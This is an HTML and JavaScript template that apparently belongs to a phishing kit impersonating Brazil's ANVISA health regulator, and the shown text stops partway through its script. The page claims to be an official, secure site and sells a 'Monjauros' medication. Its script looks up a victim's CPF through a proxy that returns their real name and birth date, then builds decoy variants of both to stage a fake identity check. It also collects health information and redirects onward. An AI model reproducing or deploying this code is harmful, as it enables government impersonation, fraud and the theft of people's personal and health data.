<!DOCTYPE html>
<html lang="pt-BR">
<head>
 
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <title>Verificação de Dados - ANVISA</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    @font-face {
      font-family: 'Rawline';
      src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
      font-weight: 400;
      font-style: normal;
    }
    @font-face {
      font-family: 'Rawline';
      src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
      font-weight: 400;
      font-style: italic;
    }
    @font-face {
      font-family: 'Rawline';
      src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
      font-weight: 500;
      font-style: normal;
    }
    @font-face {
      font-family: 'Rawline';
      src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
      font-weight: 600;
      font-style: normal;
    }
    @font-face {
      font-family: 'Rawline';
      src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
      font-weight: 700;
      font-style: normal;
    }
    
    body {
      font-family: 'Rawline', sans-serif;
      background-color: #f8f9fa;
    }
    .main-title {
      font-size: 1.4rem;
      line-height: 2rem;
      font-weight: 600;
      color: #0c326f;
      padding-bottom: 10px;
      margin: 0;
    }
    .subtitle {
      font-weight: 400;
      font-size: 16px;
      color: #555;
      line-height: normal;
      margin-bottom: 10px;
    }
    .sticky-header {
      position: sticky;
      top: 0;
      background-color: white;
      z-index: 1000;
      transition: box-shadow 0.3s ease;
    }
    .sticky-header.shadow {
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .secure-badge {
      background-color: #e6f3e6;
      padding: 5px 10px;
      border-radius: 5px;
      font-size: 12px;
      color: #2e7d32;
      display: inline-flex;
      align-items: center;
      margin-right: 8px;
    }
    .secure-badge i {
      margin-right: 4px;
    }
    .validation-container {
      background-color: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
      margin: 20px auto;
      max-width: 500px;
    }
    .info-box {
      background-color: #f1f7fe;
      border-left: 4px solid #1351b4;
      padding: 15px;
      margin: 20px 0;
      border-radius: 0 5px 5px 0;
    }
    .info-icon {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background-color: #e3f2fd;
      color: #1351b4;
      margin-right: 15px;
    }
    .loader {
      border: 3px solid #f3f3f3;
      border-radius: 50%;
      border-top: 3px solid #1351b4;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .data-row {
      display: flex;
      margin-bottom: 15px;
      padding-bottom: 15px;
      border-bottom: 1px solid #eee;
    }
    .data-label {
      width: 40%;
      font-weight: 500;
      color: #555;
    }
    .data-value {
      width: 60%;
      font-weight: 600;
      color: #333;
    }
    .confirm-button {
      background-color: #1351b4;
      color: white;
      padding: 12px 25px;
      border: none;
      border-radius: 30px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }
    .confirm-button:hover {
      background-color: #0c3d8a;
    }
    .confirm-button:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }
    .hidden {
      display: none;
    }
    .vlibras-icon {
      position: fixed;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      z-index: 1000;
    }
    
    /* Estilos para as opções de seleção */
    .option-button {
      transition: all 0.3s ease;
    }
    .option-button:hover {
      border-color: #1351b4;
      background-color: #f0f7ff;
    }
    .option-button.selected {
      border-color: #1351b4;
      background-color: #e6f0ff;
    }
    .option-button.border-green-500 {
      animation: pulse-green 2s infinite;
    }
    
    /* Animação de pulsação verde para seleção correta */
    @keyframes pulse-green {
      0% {
        box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7);
      }
      70% {
        box-shadow: 0 0 0 10px rgba(34, 197, 94, 0);
      }
      100% {
        box-shadow: 0 0 0 0 rgba(34, 197, 94, 0);
      }
    }
    
    /* Estilos para as etapas de carregamento */
    .loading-step {
      transition: opacity 0.5s ease;
    }
    
    /* Estilos para questionário de saúde */
    #questionarioSaude h3 {
      border-bottom: 2px solid #1351b4;
      padding-bottom: 10px;
      display: inline-block;
    }
    
    /* Estilizar inputs de radio e checkbox */
    input[type="radio"], 
    input[type="checkbox"] {
      width: 18px;
      height: 18px;
      accent-color: #1351b4;
    }
  </style>
</head>
<body>
  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
  <div class="sticky-header">
    <div class="container mx-auto px-4 border-b border-[#0000001a]">
      <div class="flex items-center justify-between py-2">
        <div class="flex items-center">
          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
            Centro de Verificação Digital | ANVISA
          </p>
        </div>
        <div class="flex items-center space-x-4">
          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
        </div>
      </div>
    </div>
  </div>
  
  <div class="container mx-auto px-4">
    <div class="py-4">
      <div class="flex items-center space-x-2 text-[13px]">
        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
        <span class="text-[#9E9D9D]">&gt;</span>
        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
        <span class="text-[#9E9D9D]">&gt;</span>
        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
        <span class="text-[#9E9D9D]">&gt;</span>
        <span class="font-bold">Validação de Dados</span>
      </div>
    </div>
  </div>

  <main class="max-w-3xl mx-auto px-4 py-6">
    <div class="mb-6">
      <h2 class="main-title">
        Validação de Dados Pessoais
      </h2>
      <p class="subtitle">
        Confirme seus dados para prosseguir com o processo de aquisição do Monjauros.
      </p>
    </div>
    
    <div class="flex flex-wrap justify-center gap-3 my-4">
      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
      <span class="secure-badge"><i class="fas fa-database"></i> Dados Protegidos</span>
    </div>
    
    <div class="info-box flex items-start">
      <div class="info-icon">
        <i class="fas fa-info"></i>
      </div>
      <div>
        <h3 class="font-semibold text-[#1351b4] mb-1">Verificação de Identidade</h3>
        <p class="text-sm">Seus dados serão consultados na base governamental para confirmar sua identidade. Este processo é 100% seguro e seus dados estão protegidos de acordo com a LGPD.</p>
      </div>
    </div>
    
    <div class="validation-container">
      <div class="text-center">
        <h3 class="text-lg font-semibold text-[#0c326f] mb-2">Consulta de CPF</h3>
        <p class="text-sm text-gray-600 mb-4">Confira se os dados estão corretos</p>
        
        <div class="flex justify-center mb-4">
          <div class="border border-gray-300 rounded px-4 py-2 text-center">
            <label class="block text-xs text-gray-500 mb-1">CPF</label>
            <span id="cpfInput" class="text-lg font-bold"></span>
          </div>
        </div>
        
        <p id="statusMessage" class="mb-4 font-medium text-blue-600">Consultando dados...</p>
        
        <div id="loader" class="loader"></div>
        
        <!-- Contêiner para opções de seleção (nome e data de nascimento) -->
        <div id="opcoesContainer" class="hidden">
          <!-- As opções serão adicionadas dinamicamente pelo JavaScript -->
        </div>
        
        <!-- Etapas de carregamento -->
        <div id="loadingSteps" class="hidden bg-white p-6 rounded-lg shadow-sm mb-6">
          <h3 class="text-lg font-semibold text-[#0c326f] mb-4">Verificação em andamento</h3>
          <p class="text-sm text-gray-600 mb-4">Aguarde enquanto verificamos seus dados nos sistemas oficiais.</p>
          <!-- As etapas serão adicionadas dinamicamente pelo JavaScript -->
        </div>
        
        <!-- Questionário de saúde -->
        <div id="questionarioSaude" class="hidden bg-white p-6 rounded-lg shadow-sm">
          <h3 class="text-lg font-semibold text-[#0c326f] mb-4">Questionário de Saúde</h3>
          <p class="text-sm text-gray-600 mb-6">Para finalizar o processo, por favor, responda às seguintes perguntas sobre sua saúde:</p>
          
          <form id="healthForm" onsubmit="submitHealthForm(event)">
            <!-- Peso -->
            <div class="mb-8">
              <h4 class="font-semibold text-gray-700 mb-3">1. Peso Atual Aproximado</h4>
              <div class="space-y-2">
                <label class="flex items-center">
                  <input type="radio" name="peso" value="menos60" class="mr-3" required>
                  <span>Menos de 60 kg</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="peso" value="60a80" class="mr-3">
                  <span>60 a 80 kg</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="peso" value="81a100" class="mr-3">
                  <span>81 a 100 kg</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="peso" value="mais100" class="mr-3">
                  <span>Mais de 100 kg</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="peso" value="naoInformar" class="mr-3">
                  <span>Prefiro não informar</span>
                </label>
              </div>
            </div>
            
            <!-- Altura -->
            <div class="mb-8">
              <h4 class="font-semibold text-gray-700 mb-3">2. Altura Aproximada</h4>
              <div class="space-y-2">
                <label class="flex items-center">
                  <input type="radio" name="altura" value="menos150" class="mr-3" required>
                  <span>Menos de 1,50 m</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="altura" value="150a165" class="mr-3">
                  <span>1,50 m a 1,65 m</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="altura" value="166a180" class="mr-3">
                  <span>1,66 m a 1,80 m</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="altura" value="mais180" class="mr-3">
                  <span>Mais de 1,80 m</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="altura" value="naoInformar" class="mr-3">
                  <span>Prefiro não informar</span>
                </label>
              </div>
            </div>
            
            <!-- Motivo da Prescrição -->
            <div class="mb-8">
              <h4 class="font-semibold text-gray-700 mb-3">3. Motivo da Prescrição</h4>
              <div class="space-y-2">
                <label class="flex items-center">
                  <input type="radio" name="motivoPrescrição" value="diabetes" class="mr-3" required>
                  <span>Controle de açúcar no sangue (diabetes)</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="motivoPrescrição" value="peso" class="mr-3">
                  <span>Controle de peso</span>
                </label>
                <label class="flex items-start">
                  <input type="radio" name="motivoPrescrição" value="outro" class="mr-3 mt-1">
                  <div>
                    <span>Outro motivo</span>
                    <input type="text" placeholder="Indique, se quiser" class="block mt-1 p-2 border border-gray-300 rounded text-sm w-full">
                  </div>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="motivoPrescrição" value="naoSei" class="mr-3">
                  <span>Não sei/Não informado pelo médico</span>
                </label>
              </div>
            </div>
            
            <!-- Uso de Outros Medicamentos -->
            <div class="mb-8">
              <h4 class="font-semibold text-gray-700 mb-3">4. Uso de Outros Medicamentos</h4>
              <div class="space-y-2">
                <label class="flex items-center">
                  <input type="radio" name="usoMedicamentos" value="sim" class="mr-3" required>
                  <span>Sim, tomo medicamentos regularmente</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="usoMedicamentos" value="nao" class="mr-3">
                  <span>Não, não tomo medicamentos</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="usoMedicamentos" value="naoInformar" class="mr-3">
                  <span>Não sei/Prefiro não informar</span>
                </label>
              </div>
            </div>
            
            <!-- Condições de Saúde -->
            <div class="mb-8">
              <h4 class="font-semibold text-gray-700 mb-3">5. Condições de Saúde Atuais</h4>
              <div class="space-y-2">
                <label class="flex items-center">
                  <input type="checkbox" name="condicoesSaude" value="diabetes" class="mr-3">
                  <span>Diabetes</span>
                </label>
                <label class="flex items-center">
                  <input type="checkbox" name="condicoesSaude" value="pressaoAlta" class="mr-3">
                  <span>Pressão alta</span>
                </label>
                <label class="flex items-center">
                  <input type="checkbox" name="condicoesSaude" value="problemasCoracao" class="mr-3">
                  <span>Problemas de coração</span>
                </label>
                <label class="flex items-center">
                  <input type="checkbox" name="condicoesSaude" value="nenhuma" class="mr-3">
                  <span>Nenhuma condição de saúde</span>
                </label>
                <label class="flex items-start">
                  <input type="checkbox" name="condicoesSaude" value="outra" class="mr-3 mt-1">
                  <div>
                    <span>Outra</span>
                    <input type="text" placeholder="Indique, se quiser" class="block mt-1 p-2 border border-gray-300 rounded text-sm w-full">
                  </div>
                </label>
                <label class="flex items-center">
                  <input type="checkbox" name="condicoesSaude" value="naoInformar" class="mr-3">
                  <span>Prefiro não informar</span>
                </label>
              </div>
            </div>
            
            <!-- Atividade Física -->
            <div class="mb-8">
              <h4 class="font-semibold text-gray-700 mb-3">6. Atividade Física</h4>
              <div class="space-y-2">
                <label class="flex items-center">
                  <input type="radio" name="atividadeFisica" value="regular" class="mr-3" required>
                  <span>Faço exercícios regularmente (ex.: caminhada, academia)</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="atividadeFisica" value="asVezes" class="mr-3">
                  <span>Faço exercícios às vezes</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="atividadeFisica" value="nao" class="mr-3">
                  <span>Não faço exercícios</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="atividadeFisica" value="naoInformar" class="mr-3">
                  <span>Prefiro não informar</span>
                </label>
              </div>
            </div>
            
            <!-- Hábito Alimentar -->
            <div class="mb-8">
              <h4 class="font-semibold text-gray-700 mb-3">7. Hábito Alimentar</h4>
              <div class="space-y-2">
                <label class="flex items-center">
                  <input type="radio" name="habitoAlimentar" value="dietaMedica" class="mr-3" required>
                  <span>Sigo uma dieta recomendada por médico ou nutricionista</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="habitoAlimentar" value="tentaSaudavel" class="mr-3">
                  <span>Tento comer de forma saudável</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="habitoAlimentar" value="naoEspecifica" class="mr-3">
                  <span>Não sigo uma dieta específica</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="habitoAlimentar" value="naoInformar" class="mr-3">
                  <span>Prefiro não informar</span>
                </label>
              </div>
            </div>
            
            <!-- Local de Residência -->
            <div class="mb-8">
              <h4 class="font-semibold text-gray-700 mb-3">8. Local de Residência</h4>
              <div class="space-y-2">
                <label class="flex items-center">
                  <input type="radio" name="localResidencia" value="urbano" class="mr-3" required>
                  <span>Urbano (cidade grande ou média)</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="localResidencia" value="rural" class="mr-3">
                  <span>Rural (interior ou zona rural)</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="localResidencia" value="pequenaCidade" class="mr-3">
                  <span>Pequena cidade</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="localResidencia" value="naoInformar" class="mr-3">
                  <span>Prefiro não informar</span>
                </label>
              </div>
            </div>
            
            <!-- Acesso a Farmácias ou Postos de Saúde -->
            <div class="mb-8">
              <h4 class="font-semibold text-gray-700 mb-3">9. Acesso a Farmácias ou Postos de Saúde</h4>
              <div class="space-y-2">
                <label class="flex items-center">
                  <input type="radio" name="acessoFarmacia" value="facil" class="mr-3" required>
                  <span>Tenho acesso fácil (perto da minha casa)</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="acessoFarmacia" value="distante" class="mr-3">
                  <span>Tenho acesso, mas é distante</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="acessoFarmacia" value="dificil" class="mr-3">
                  <span>Não tenho acesso fácil</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="acessoFarmacia" value="naoInformar" class="mr-3">
                  <span>Prefiro não informar</span>
                </label>
              </div>
            </div>
            
            <!-- Nível de Escolaridade -->
            <div class="mb-8">
              <h4 class="font-semibold text-gray-700 mb-3">10. Nível de Escolaridade</h4>
              <div class="space-y-2">
                <label class="flex items-center">
                  <input type="radio" name="escolaridade" value="fundamental" class="mr-3" required>
                  <span>Ensino fundamental ou menos</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="escolaridade" value="medio" class="mr-3">
                  <span>Ensino médio</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="escolaridade" value="superior" class="mr-3">
                  <span>Ensino superior</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="escolaridade" value="naoEstudou" class="mr-3">
                  <span>Não estudei</span>
                </label>
                <label class="flex items-center">
                  <input type="radio" name="escolaridade" value="naoInformar" class="mr-3">
                  <span>Prefiro não informar</span>
                </label>
              </div>
            </div>
            
            <!-- Botão de envio e mensagem de processamento -->
            <div class="mt-8">
              <button type="submit" id="submitHealthButton" class="confirm-button w-full">
                <i class="fas fa-check-circle mr-2"></i> Finalizar e Prosseguir
              </button>
              <div id="healthFormLoader" class="loader mt-4 hidden"></div>
            </div>
          </form>
        </div>
      </div>
    </div>
    
    <div class="bg-white p-4 rounded-lg shadow-sm mt-6">
      <p class="font-bold text-gray-700 text-base mb-2">
        <i class="fas fa-shield-alt text-green-600 mr-2"></i>
        Sistema de Verificação Segura
      </p>
      <p class="text-gray-700 text-sm">
        A verificação de identidade é realizada utilizando conexão criptografada e todos os seus dados são processados com os mais altos padrões de segurança em conformidade com a Lei Geral de Proteção de Dados (LGPD).
      </p>
    </div>
  </main>
  
  <div class="w-full mt-6">
    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
  </div>
  
  <a href="#" class="vlibras-icon">
    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
  </a>
  
  <script>
    // Função para obter parâmetros da URL
    function getUrlParameter(name) {
      name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
      var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
      var results = regex.exec(location.search);
      return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
    }
    
    // Configurações da página
    window.addEventListener('scroll', function() {
      var header = document.querySelector('.sticky-header');
      if (window.pageYOffset > 0) {
        header.classList.add('shadow');
      } else {
        header.classList.remove('shadow');
      }
    });
    
    // Função para gerar nome aleatório similar
    function generateSimilarName(originalName) {
      if (!originalName) return 'João da Silva';
      
      // Obter partes do nome original
      const parts = originalName.split(' ');
      if (parts.length < 2) return originalName;
      
      // Variantes de nomes comuns para substituição
      const firstNameVariants = {
        'JOÃO': ['JOSÉ', 'JOEL', 'JONAS', 'JOAQUIM'],
        'MARIA': ['MARIANA', 'MARISA', 'MARINA', 'MARTA'],
        'JOSÉ': ['JOÃO', 'JOSIAS', 'JOSUÉ', 'JOSEMAR'],
        'ANA': ['ANITA', 'ANABELA', 'ANAÍSA', 'ANALU'],
        'PEDRO': ['PAULO', 'PATRICK', 'PÉRICLES', 'PLÍNIO'],
        'CARLOS': ['CAIO', 'CÁSSIO', 'CLÁUDIO', 'CÉSAR'],
        'ANTONIO': ['ANDRE', 'AUGUSTO', 'ADILSON', 'ADEMAR'],
        'PAULO': ['PEDRO', 'PATRICK', 'PLÍNIO', 'PÉRICLES']
      };
      
      const lastNameVariants = {
        'SILVA': ['SILVEIRA', 'SILVINO', 'SILVESTRE', 'SILVESTRINI'],
        'SANTOS': ['SANTIAGO', 'SANTANA', 'SANTO', 'SANTORO'],
        'OLIVEIRA': ['OLIVARES', 'OLIVA', 'OLIVER', 'OLIVO'],
        'SOUZA': ['SOUZANO', 'SOUTELO', 'SOUTO', 'SOUTINHO'],
        'PEREIRA': ['PERES', 'PERETTI', 'PEREZ', 'PERRONE'],
        'ALMEIDA': ['ALVES', 'ALMADA', 'ALVES', 'ALTMAN'],
        'FERREIRA': ['FERRARI', 'FERRÃO', 'FERRO', 'FERRAZ'],
        'RODRIGUES': ['RODRIGUEZ', 'ROCHA', 'REIS', 'ROSA']
      };
      
      // Tenta substituir o primeiro nome se houver variante disponível
      let firstName = parts[0].toUpperCase();
      let newFirstName = firstName;
      if (firstNameVariants[firstName]) {
        const variants = firstNameVariants[firstName];
        newFirstName = variants[Math.floor(Math.random() * variants.length)];
      }
      
      // Tenta substituir o último nome se houver variante disponível
      let lastName = parts[parts.length - 1].toUpperCase();
      let newLastName = lastName;
      if (lastNameVariants[lastName]) {
        const variants = lastNameVariants[lastName];
        newLastName = variants[Math.floor(Math.random() * variants.length)];
      }
      
      // Reconstrói o nome com as partes do meio
      let middleParts = '';
      if (parts.length > 2) {
        middleParts = parts.slice(1, parts.length - 1).join(' ') + ' ';
      }
      
      return `${newFirstName} ${middleParts}${newLastName}`;
    }
    
    // Função para gerar data de nascimento aleatória similar
    function generateSimilarDate(originalDate) {
      if (!originalDate) return '01/01/1980';
      
      const [ano, mes, dia] = originalDate.split('T')[0].split('-');
      
      // Gerar uma variação de até 5 anos para mais ou para menos
      const yearVariation = Math.floor(Math.random() * 5) * (Math.random() > 0.5 ? 1 : -1);
      let newYear = parseInt(ano) + yearVariation;
      
      // Garantir que o ano está em um intervalo razoável
      if (newYear < 1950) newYear = 1950;
      if (newYear > new Date().getFullYear() - 18) newYear = new Date().getFullYear() - 18;
      
      // Variação de mês (1-2 meses para mais ou para menos)
      let newMonth = parseInt(mes) + Math.floor(Math.random() * 2) * (Math.random() > 0.5 ? 1 : -1);
      if (newMonth < 1) newMonth = 12 + newMonth;
      if (newMonth > 12) newMonth = newMonth - 12;
      
      // Variação de dia (1-5 dias para mais ou para menos)
      let newDay = parseInt(dia) + Math.floor(Math.random() * 5) * (Math.random() > 0.5 ? 1 : -1);
      const maxDays = new Date(newYear, newMonth, 0).getDate();
      if (newDay < 1) newDay = 1;
      if (newDay > maxDays) newDay = maxDays;
      
      // Formatação
      newMonth = newMonth.toString().padStart(2, '0');
      newDay = newDay.toString().padStart(2, '0');
      
      return `${newDay}/${newMonth}/${newYear}`;
    }
    
    // Consulta de CPF e exibição de opções
    document.addEventListener('DOMContentLoaded', async function() {
      // Obter CPF da URL
      const cpf = getUrlParameter('cpf');
      if (!cpf) {
        console.error('CPF não encontrado na URL');
        document.getElementById('statusMessage').textContent = 'CPF não fornecido';
        document.getElementById('loader').style.display = 'none';
        return;
      }
      
      // Exibir CPF no formato correto
      document.getElementById('cpfInput').textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
      
      try {
        console.log('Consultando CPF:', cpf);
        // Fazer requisição para o proxy
        const response = await fetch('/proxy-consulta-cpf', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ cpf: cpf })
        });
        
        console.log('Status da resposta:', response.status);
        
        if (!response.ok) {
          throw new Error(`Erro na consulta: ${response.status}`);
        }
        
        const data = await response.json();
        console.log('Dados recebidos:', data);
        
        // Verificar se a consulta foi bem-sucedida
        if (data.Result) {
          // Ocultar loader
          document.getElementById('loader').style.display = 'none';
          document.getElementById('statusMessage').textContent = 'Confirme seus dados';
          document.getElementById('statusMessage').className = 'mb-4 font-medium text-blue-600';
          
          // Formatar data de nascimento original
          let dataNascimento = '';
          if (data.Result.DataNascimento) {
            const dataNasc = data.Result.DataNascimento.split('T')[0];
            const [ano, mes, dia] = dataNasc.split('-');
            dataNascimento = `${dia}/${mes}/${ano}`;
          }
          
          // Obter o nome original
          const nomeOriginal = data.Result.NomePessoaFisica || '';
          
          // Criar opções de nomes e datas
          const opcoesContainer = document.getElementById('opcoesContainer');
          opcoesContainer.classList.remove('hidden');
          
          // Preparar dados reais para incluir nas opções
          const dadosReais = {
            nome: nomeOriginal,
            data: dataNascimento
          };
          
          // Definir o estado da validação
          let validacaoState = {
            etapaAtual: 'nome', // 'nome' ou 'data'
            nomeCorretoSelecionado: false,
            dataCorretaSelecionada: false
          };
          
          // Função para criar o HTML da etapa de nomes
          function criarEtapaNomes() {
            opcoesContainer.innerHTML = `
              <h3 class="font-semibold text-gray-700 mb-4">Etapa 1: Selecione seu nome completo:</h3>
              <div id="opcoesNome" class="space-y-3 mb-6"></div>
              <div id="opcaoError" class="hidden text-center mt-4 text-red-600 font-medium">
                O nome selecionado não corresponde aos seus dados oficiais. Por favor, tente novamente.
              </div>
              <div id="opcaoSuccess" class="hidden text-center mt-4 text-green-600 font-medium">
                Nome correto! Prosseguindo para a próxima etapa...
              </div>
            `;
            
            const numOpcoes = 5;
            let opcoesNome = [];
            
            // Adicionar opção real
            opcoesNome.push({
              id: 'nome-real',
              nome: dadosReais.nome,
              correto: true
            });
            
            // Adicionar opções falsas
            for (let i = 1; i < numOpcoes; i++) {
              opcoesNome.push({
                id: `nome-${i}`,
                nome: generateSimilarName(nomeOriginal),
                correto: false
              });
            }
            
            // Embaralhar opções
            opcoesNome = opcoesNome.sort(() => Math.random() - 0.5);
            
            // Criar HTML das opções de nome
            const opcoesHTML = document.getElementById('opcoesNome');
            
            opcoesNome.forEach((opcao, index) => {
              const optionElement = document.createElement('div');
              optionElement.className = 'option-button border rounded-md p-4 cursor-pointer hover:border-blue-500';
              optionElement.setAttribute('data-id', opcao.id);
              optionElement.setAttribute('data-correct', opcao.correto);
              
              optionElement.innerHTML = `
                <div class="flex justify-between items-center">
                  <span class="font-semibold">${opcao.nome}</span>
                  <span class="text-sm text-gray-500">Opção ${index + 1}</span>
                </div>
              `;
              
              opcoesHTML.appendChild(optionElement);
              
              // Adicionar evento de clique
              optionElement.addEventListener('click', function() {
                handleNomeSelection(this);
              });
            });
          }
          
          // Função para criar o HTML da etapa de datas
          function criarEtapaDatas() {
            opcoesContainer.innerHTML = `
              <h3 class="font-semibold text-gray-700 mb-4">Etapa 2: Selecione sua data de nascimento:</h3>
              <div id="opcoesDatas" class="space-y-3 mb-6"></div>
              <div id="opcaoError" class="hidden text-center mt-4 text-red-600 font-medium">
                A data selecionada não corresponde aos seus dados oficiais. Por favor, tente novamente.
              </div>
              <div id="opcaoSuccess" class="hidden text-center mt-4 text-green-600 font-medium">
                Data correta! Validação concluída com sucesso.
              </div>
            `;
            
            const numOpcoes = 5;
            let opcoesDatas = [];
            
            // Adicionar opção real
            opcoesDatas.push({
              id: 'data-real',
              data: dadosReais.data,
              correto: true
            });
            
            // Adicionar opções falsas
            for (let i = 1; i < numOpcoes; i++) {
              opcoesDatas.push({
                id: `data-${i}`,
                data: generateSimilarDate(data.Result.DataNascimento),
                correto: false
              });
            }
            
            // Embaralhar opções
            opcoesDatas = opcoesDatas.sort(() => Math.random() - 0.5);
            
            // Criar HTML das opções de data
            const opcoesHTML = document.getElementById('opcoesDatas');
            
            opcoesDatas.forEach((opcao, index) => {
              const optionElement = document.createElement('div');
              optionElement.className = 'option-button border rounded-md p-4 cursor-pointer hover:border-blue-500';
              optionElement.setAttribute('data-id', opcao.id);
              optionElement.setAttribute('data-correct', opcao.correto);
              
              optionElement.innerHTML = `
                <div class="flex justify-between items-center">
                  <span class="font-semibold">${opcao.data}</span>
                  <span class="text-sm text-gray-500">Opção ${index + 1}</span>
                </div>
              `;
              
              opcoesHTML.appendChild(optionElement);
              
              // Adicionar evento de clique
              optionElement.addEventListener('click', function() {
                handleDataSelection(this);
              });
            });
          }
          
          // Handler para seleção de nome
          function handleNomeSelection(element) {
            // Remover seleção anterior
            document.querySelectorAll('.option-button').forEach(b => b.classList.remove('selected'));
            
            // Marcar a opção selecionada
            element.classList.add('selected');
            
            // Verificar se a opção está correta
            const isCorrect = element.getAttribute('data-correct') === 'true';
            
            // Resetar mensagens
            document.getElementById('opcaoError').classList.add('hidden');
            document.getElementById('opcaoSuccess').classList.add('hidden');
            
            if (isCorrect) {
              // Mostrar mensagem de sucesso
              document.getElementById('opcaoSuccess').classList.remove('hidden');
              
              // Adicionar efeito visual na opção correta
              element.classList.add('border-green-500');
              
              // Atualizar estado
              validacaoState.nomeCorretoSelecionado = true;
              
              // Avançar para a próxima etapa após um breve momento
              setTimeout(() => {
                validacaoState.etapaAtual = 'data';
                criarEtapaDatas();
              }, 1500);
              
            } else {
              // Mostrar mensagem de erro
              document.getElementById('opcaoError').classList.remove('hidden');
              
              // Adicionar efeito visual na opção errada
              element.classList.add('border-red-500');
              
              // Resetar após um período
              setTimeout(() => {
                element.classList.remove('border-red-500', 'selected');
                document.getElementById('opcaoError').classList.add('hidden');
              }, 2000);
            }
          }
          
          // Handler para seleção de data
          function handleDataSelection(element) {
            // Remover seleção anterior
            document.querySelectorAll('.option-button').forEach(b => b.classList.remove('selected'));
            
            // Marcar a opção selecionada
            element.classList.add('selected');
            
            // Verificar se a opção está correta
            const isCorrect = element.getAttribute('data-correct') === 'true';
            
            // Resetar mensagens
            document.getElementById('opcaoError').classList.add('hidden');
            document.getElementById('opcaoSuccess').classList.add('hidden');
            
            if (isCorrect) {
              // Mostrar mensagem de sucesso
              document.getElementById('opcaoSuccess').classList.remove('hidden');
              
              // Adicionar efeito visual na opção correta
              element.classList.add('border-green-500');
              
              // Atualizar estado
              validacaoState.dataCorretaSelecionada = true;
              
              // Ambas etapas concluídas com sucesso, redirecionar
              setTimeout(() => {
                window.location.href = '/validacao-em-andamento?cpf=' + cpf;
              }, 1500);
              
            } else {
              // Mostrar mensagem de erro
              document.getElementById('opcaoError').classList.remove('hidden');
              
              // Adicionar efeito visual na opção errada
              element.classList.add('border-red-500');
              
              // Resetar após um período
              setTimeout(() => {
                element.classList.remove('border-red-500', 'selected');
                document.getElementById('opcaoError').classList.add('hidden');
              }, 2000);
            }
          }
          
          // Iniciar com a etapa de seleção de nome
          criarEtapaNomes();
          
        } else {
          // Exibir mensagem de erro se não houver dados
          document.getElementById('loader').style.display = 'none';
          document.getElementById('statusMessage').textContent = 'Dados não encontrados. Por favor, verifique o CPF informado.';
          document.getElementById('statusMessage').className = 'mb-4 font-medium text-red-600';
        }
